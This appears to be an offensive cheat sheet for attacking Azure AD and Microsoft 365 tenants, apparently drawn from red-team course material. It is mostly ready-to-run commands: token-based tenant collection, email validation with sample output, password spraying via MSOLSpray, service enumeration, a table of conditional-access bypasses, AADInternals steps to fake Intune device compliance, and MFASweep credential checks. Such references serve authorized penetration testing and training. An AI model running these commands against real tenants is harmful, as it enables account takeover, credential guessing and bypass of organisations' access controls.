# Azure AD Enumerate

## Azure AD - Collectors

* roadrecon
    ```ps1
    roadrecon auth --access-token eyJ0eXA...
    roadrecon auth --prt-cookie <primary-refresh-token> -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2"
    roadrecon gather
    ```
* AzureHound
    ```ps1
    ./azurehound --refresh-token <refresh-token> list --tenant "<target-tenant-id>" -o output.json
    ```


## Azure AD - User Enumeration

### Enumerate Tenant Informations

* Federation with Azure AD or O365
    ```powershell
    https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
    ```
* Get the Tenant ID
    ```powershell
    https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
    https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration
    ```


### Enumerate Email

> By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.

* Validate email 
    ```powershell
    PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
    admin@<TENANT NAME>.onmicrosoft.com   - VALID
    root@<TENANT NAME>.onmicrosoft.com    - INVALID
    test@<TENANT NAME>.onmicrosoft.com    - VALID
    contact@<TENANT NAME>.onmicrosoft.com - INVALID
    ```
* Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon


### Password Spraying

```powershell
PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
```


## Azure Services Enumeration

### Enumerate Tenant Domains

Extract openly available information for the given tenant: [aadinternals.com/osint](https://aadinternals.com/osint/)

```ps1
Invoke-AADIntReconAsOutsider -Domain "company.com" | Format-Table
Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
```


### Enumerate Azure Subdomains

```powershell
PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
Subdomain Service
--------- -------
<TENANT NAME>.mail.protection.outlook.com Email
<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
```

### Enumerate Services

* Using Az Powershell module
    ```powershell
    PS Az> Get-AzResource
    PS Az> Get-AzVM | fl
    PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
    PS Az> Get-AzFunctionApp
    PS Az> Get-AzStorageAccount | fl
    PS Az> Get-AzKeyVault
    PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com
    ```

* Using az cli
    ```powershell
    PS> az vm list
    PS> az vm list --query "[].[name]" -o table
    PS> az webapp list
    PS> az functionapp list --query "[].[name]" -o table
    PS> az storage account list
    PS> az keyvault list
    ```


## Conditional Access Policy

Conditional Access is used to restrict access to resources to compliant devices only.

* Enumerate Conditional Access Policies: `roadrecon plugin policies` (query the local database)

| CAP                       | Bypass  |
|---------------------------|---------|
| Location / IP ranges      | Corporate VPN, Guest Wifi |
| Platform requirement      | User-Agent switcher (Android, PS4, Linux, ...) |
| Protocol requirement      | Use another protocol (e.g for e-mail acccess:  POP, IMAP, SMTP) |
| Azure AD Joined Device    | Try to join a VM (Work Access)|
| Compliant Device (Intune) | Fake device compliance |
| Device requirement        | / |
| MFA                       | / |
| Legacy Protocols          | / |
| Domain Joined             | / |


Bypassing conditional access by faking device compliance

```powershell
# AAD Internals - Making your device compliant
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache
# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
# Marking device compliant - option 1: Registering device to Intune
# Get an access token for Intune MDM and save to cache (prompts for credentials)
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
# Join the device to Intune
Join-AADIntDeviceToIntune -DeviceName "SixByFour"
# Start the call back
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
```


## Multi Factor Authentication

* [dafthack/MFASweep](https://github.com/dafthack/MFASweep) - A tool for checking if MFA is enabled on multiple Microsoft Services
```ps1
Import-Module .\MFASweep.ps1
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS
```


## References

* [Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD](https://o365blog.com/post/mdm/)
* [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)